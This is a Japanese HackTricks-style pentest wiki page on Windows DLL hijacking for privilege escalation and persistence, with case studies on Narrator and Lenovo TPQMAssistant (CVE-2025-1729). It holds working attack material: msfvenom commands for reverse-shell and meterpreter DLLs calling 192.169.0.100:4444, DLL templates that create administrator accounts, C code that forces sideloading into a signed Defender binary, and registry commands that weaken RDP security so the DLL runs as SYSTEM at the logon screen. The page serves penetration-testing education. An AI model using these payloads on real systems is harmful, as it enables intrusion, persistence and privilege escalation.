# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本情報

DLL Hijackingは、信頼されたアプリケーションに悪意のあるDLLを読み込ませる操作を指します。この用語は**DLL Spoofing, Injection, and Side-Loading**のようないくつかの戦術を包含します。主にcode execution、persistence、そしてまれにprivilege escalationのために利用されます。ここではescalationに焦点を当てていますが、ハイジャックの手法自体は目的に関係なく一貫しています。

### 一般的な手法

DLL hijackingにはいくつかの方法があり、どれが有効かはアプリケーションのDLL読み込み戦略によります：

1. **DLL Replacement**: 正当なDLLを悪意のあるものと差し替える。元のDLLの機能を保持するためにDLL Proxyingを併用することもあります。
2. **DLL Search Order Hijacking**: 正規のDLLよりも先に検索されるパスに悪意のあるDLLを置くことで、アプリケーションの検索パターンを突く手法。
3. **Phantom DLL Hijacking**: アプリケーションが必要とするが存在しないDLLとして、悪意のあるDLLを作成して読み込ませる手法。
4. **DLL Redirection**: %PATH% や .exe.manifest / .exe.local のような検索パラメータを変更して、アプリケーションを悪意のあるDLLに向ける手法。
5. **WinSxS DLL Replacement**: WinSxSディレクトリ内の正規のDLLを悪意のあるDLLに置き換える方法。DLL side-loading に関連することが多いです。
6. **Relative Path DLL Hijacking**: コピーしたアプリケーションとともにユーザー管理下のディレクトリに悪意のあるDLLを置く手法で、Binary Proxy Executionの技法に似ています。

## Finding missing Dlls

システム内の欠落したDllsを見つける最も一般的な方法は、sysinternalsの[procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)を実行し、次の**2つのフィルタ**を設定することです：

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

そして**File System Activity**だけを表示します：

![](<../../../images/image (153).png>)

一般的な**missing dlls**を探している場合は、これを数秒間実行したままにします。\
特定の実行ファイル内の**missing dll**を探している場合は、"Process Name" "contains" `<exec name>` のような別のフィルタを設定し、その実行ファイルを起動してからイベントのキャプチャを停止してください。

## Exploiting Missing Dlls

権限を昇格させるための最善の方法は、privilegeプロセスが読み込もうとするdllを、プロセスが検索する場所のいずれかに書き込めるようにすることです。したがって、元のdllが存在するフォルダよりも先に検索されるフォルダにdllを書き込めるケース（奇妙なケース）や、検索されるフォルダに書き込めて元のdllがどのフォルダにも存在しないケースのいずれかになります。

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Windowsアプリケーションは、あらかじめ定義された検索パスのセットに従ってDLLを探し、特定の順序で検索します。悪意のあるDLLがこれらのディレクトリのいずれかに戦略的に配置され、正規のDLLより先に読み込まれるとDLL hijackingが発生します。この問題を防ぐには、アプリケーションが必要とするDLLを参照するときに絶対パスを使用することが有効です。

32-bitシステムにおけるDLL検索順は以下の通りです：

1. アプリケーションがロードされたディレクトリ。
2. システムディレクトリ。パスを取得するには[**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)関数を使用します。(_C:\Windows\System32_)
3. 16-bitシステムディレクトリ。パスを取得する関数はありませんが、検索されます。(_C:\Windows\System_)
4. Windowsディレクトリ。パスを取得するには[**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)関数を使用します。
1. (_C:\Windows_)
5. カレントディレクトリ。
6. PATH環境変数に列挙されたディレクトリ。ただし、これは**App Paths**レジストリキーで指定されたアプリケーションごとのパスを含みません。**App Paths**キーはDLL検索パスの計算時には使用されません。

これは**SafeDllSearchMode**が有効な場合の**デフォルト**検索順です。無効にするとカレントディレクトリが2番目に昇格します。この機能を無効にするには、**HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** レジストリ値を作成し、0に設定します（デフォルトは有効）。

もし[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa)関数が**LOAD_WITH_ALTERED_SEARCH_PATH**で呼ばれた場合、検索はLoadLibraryExがロードする実行モジュールのディレクトリで開始されます。

最後に、dllが単に名前だけでなく絶対パスで指定されて読み込まれることがある点に注意してください。その場合、そのdllはそのパスでのみ検索されます（そのdllが依存関係を持つ場合、それらは名前で読み込まれたかのように検索されます）。

検索順を変更する他の方法もありますが、ここでは説明しません。

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

新しく作成されるプロセスのDLL検索パスに決定的に影響を与える高度な方法として、ntdllのネイティブAPIでプロセスを作成するときにRTL_USER_PROCESS_PARAMETERSのDllPathフィールドを設定する方法があります。ここに攻撃者が制御するディレクトリを指定すると、ターゲットプロセスが名前でインポートされたDLL（絶対パスではなく、安全な読み込みフラグを使用していない）を解決する際に、そのディレクトリから悪意のあるDLLを読み込ませることができます。

Key idea
- RtlCreateProcessParametersExでプロセスパラメータを構築し、あなたが制御するフォルダを指すカスタムDllPathを提供します（例：あなたのdropper/unpackerが存在するディレクトリ）。
- RtlCreateUserProcessでプロセスを作成します。ターゲットバイナリがDLLを名前で解決するとき、ローダはこの供給されたDllPathを検索に利用し、悪意のあるDLLがターゲットEXEと同じ場所にない場合でも確実なsideloadingを可能にします。

Notes/limitations
- これは作成される子プロセスに影響し、SetDllDirectoryが現在のプロセスにのみ影響を与えるのとは異なります。
- ターゲットは名前でDLLをimportするかLoadLibraryする必要があります（絶対パスではなく、またLOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectoriesを使っていないこと）。
- KnownDLLsやハードコードされた絶対パスはハイジャックできません。forwarded exportsやSxSは優先順位を変える可能性があります。

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

運用での使用例
- 悪意のある xmllite.dll（必要な関数をエクスポートするか、実際の DLL にプロキシするもの）を DllPath ディレクトリに配置します。
- 上記の手法で名前により xmllite.dll を参照することが知られている署名済みバイナリを起動します。ローダーは提供された DllPath 経由でインポートを解決し、あなたの DLL を sideload します。

この手法は実環境でマルチステージの sideloading チェーンを引き起こす事例として観測されています：初期のランチャーがヘルパー DLL を展開し、それがカスタム DllPath を持つ Microsoft-署名のハイジャック可能なバイナリを起動して、ステージングディレクトリから攻撃者の DLL を読み込ませます。


#### Windows ドキュメントにおける dll 検索順の例外

Windows のドキュメントには標準の DLL 検索順に対するいくつかの例外が記載されています：

- メモリに既に読み込まれているものと同じ名前を共有する **DLL が出会った場合**、システムは通常の検索を回避します。代わりにリダイレクトとマニフェストのチェックを行い、その後で既にメモリにある DLL を既定として使用します。**この場合、システムは DLL を探索しません**。
- 現在の Windows バージョンに対して **known DLL** と認識されている DLL の場合、システムはその既知の DLL とその依存 DLL を利用し、**検索手順を省略します**。レジストリキー **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** にこれらの既知 DLL の一覧が格納されています。
- **DLL に依存関係がある場合**、これらの依存 DLL の検索は、最初の DLL がフルパスで特定されていたかどうかに関わらず、**モジュール名のみで指定されたかのように**行われます。

### Escalating Privileges

**要件**：

- **異なる権限で動作する、または将来動作するプロセス（horizontal or lateral movement）を特定**し、そのプロセスが **DLL を欠いている**ことを確認する。
- **DLL が探索される任意のディレクトリ**に対して **write access** があることを確保する。これは実行ファイルのディレクトリ、または system path 内のディレクトリである可能性があります。

はい、デフォルトでは **特権を持つ実行ファイルが DLL を欠いているケースを見つけるのはかなり難しい**ですし、system path フォルダに書き込み権限があるのはさらに **あり得ないことが多い**（通常は許可されていません）です。しかし、設定ミスのある環境ではこれは可能です。\
運よく要件を満たす状況を見つけた場合は、[UACME](https://github.com/hfiref0x/UACME) プロジェクトを確認すると良いでしょう。プロジェクトの **主目的が bypass UAC** であっても、対象の Windows バージョン向けの Dll hijacking の **PoC** が見つかるかもしれません（たぶん書き込み権限のあるフォルダのパスを変更するだけで使えます）。

フォルダ内の権限を確認するには次のようにします：
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
そして **PATH 内のすべてのフォルダの権限を確認する**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
次のコマンドで executable の imports と dll の exports を確認できます：
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### 自動化ツール

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は system PATH 内の任意のフォルダに対して書き込み権限があるかどうかを確認します。\
この脆弱性を発見するための他の興味深い自動化ツールには **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ および _Write-HijackDll_ があります。

### Example

もし悪用可能なシナリオを見つけた場合、成功させるために最も重要なことの一つは、実行ファイルがそこからインポートする少なくともすべての関数をエクスポートする**dllを作成すること**です。なお、Dll Hijacking は [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) や [ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system) による権限昇格で便利に使えます。実行目的の dll hijacking に焦点を当てたこのスタディには、**how to create a valid dll** の例が含まれています: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
さらに、**next sectio**n では、**basic dll codes** がいくつか掲載されており、**templates** として、あるいは **dll with non required functions exported** を作成するためのテンプレートとして役立つかもしれません。

## **Dlls の作成とコンパイル**

### **Dll のプロキシ化**

基本的に、**Dll proxy** はロードされたときに悪意のあるコードを実行できる一方で、実際のライブラリへの全ての呼び出しを中継して期待どおりに動作し、機能を公開する Dll です。

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) や [**Spartacus**](https://github.com/Accenture/Spartacus) といったツールを使えば、プロキシ化したい実行ファイルを指定してライブラリを選択し、**プロキシ化された dll を生成する**、あるいは **Dll を指定してプロキシ化された dll を生成する** といったことが可能です。

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter を取得する (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**ユーザーを作成する（x86、x64版は見当たりませんでした）：**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 自分用

コンパイルするDllは、被害者プロセスによってロードされるいくつかの関数を**export several functions**する必要がある場合が多いことに注意してください。これらの関数が存在しないと、**binary won't be able to load**され、**exploit will fail**。

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>ユーザー作成を行う C++ DLL の例</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>スレッドエントリを持つ代替の C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## ケーススタディ: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows の Narrator.exe は起動時に予測可能な言語別のローカライズ用 DLL を参照し、これがハイジャックされると arbitrary code execution と persistence が可能になります。

主なポイント
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Procmon による検出
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narrator を起動して上記パスの読み込み試行を観察します。

最小 DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC の沈黙
- 単純な hijack は UI を話したりハイライトしたりします。静かにするには、アタッチ時に Narrator のスレッドを列挙し、メインスレッドを開いて（`OpenThread(THREAD_SUSPEND_RESUME)`）`SuspendThread` で停止し、自分のスレッドで処理を続けます。完全なコードは PoC を参照してください。

Trigger and persistence via Accessibility configuration
- ユーザーコンテキスト (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 上記の設定により、Narrator を起動すると設置した DLL がロードされます。セキュアデスクトップ（ログオン画面）では CTRL+WIN+ENTER を押して Narrator を起動します。

RDP によってトリガーされる SYSTEM 実行 (lateral movement)
- Classic RDP セキュリティレイヤーを許可: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- ホストに RDP 接続し、ログオン画面で CTRL+WIN+ENTER を押して Narrator を起動すると、あなたの DLL がセキュアデスクトップ上で SYSTEM として実行されます。
- RDP セッションが閉じられると実行は停止します — 速やかに inject/migrate してください。

Bring Your Own Accessibility (BYOA)
- 組み込みの Accessibility Tool (AT) のレジストリエントリ（例: CursorIndicator）を複製し、任意のバイナリ/DLL を指すように編集してインポートし、`configuration` をその AT 名に設定できます。これにより Accessibility フレームワーク下で任意の実行がプロキシされます。

Notes
- `%windir%\System32` への書き込みや HKLM の値の変更は管理者権限が必要です。
- すべてのペイロードロジックは `DLL_PROCESS_ATTACH` に置けます。エクスポートは不要です。

## ケーススタディ: CVE-2025-1729 - TPQMAssistant.exe を用いた権限昇格

この事例は Lenovo の TrackPoint Quick Menu（`TPQMAssistant.exe`）における **Phantom DLL Hijacking** を示しており、**CVE-2025-1729** として追跡されています。

### 脆弱性の詳細

- **コンポーネント**: `TPQMAssistant.exe` は `C:\ProgramData\Lenovo\TPQM\Assistant\` に配置されています。
- **スケジュールされたタスク**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` はログオン中のユーザーのコンテキストで毎日 9:30 AM に実行されます。
- **ディレクトリ権限**: `CREATOR OWNER` によって書き込み可能で、ローカルユーザーが任意のファイルを配置できます。
- **DLL 検索の動作**: まず作業ディレクトリから `hostfxr.dll` をロードしようとし、存在しない場合は "NAME NOT FOUND" とログに出力します。これはローカルディレクトリの検索優先を示します。

### エクスプロイトの実装

攻撃者は同じディレクトリに悪意ある `hostfxr.dll` スタブを配置し、欠落した DLL を悪用してユーザーのコンテキストでコード実行を達成できます：
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 攻撃の流れ

1. 標準ユーザーとして、`hostfxr.dll` を `C:\ProgramData\Lenovo\TPQM\Assistant\` に配置する。
2. 現在のユーザーコンテキストで、スケジュールされたタスクが午前9:30に実行されるのを待つ。
3. タスク実行時に管理者がログインしている場合、悪意のある DLL は管理者のセッションで medium integrity（中程度の整合性）で実行される。
4. 標準的な UAC bypass techniques を連鎖させて、medium integrity から SYSTEM 特権へ昇格させる。

## 参考

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)


{{#include ../../../banners/hacktricks-training.md}}
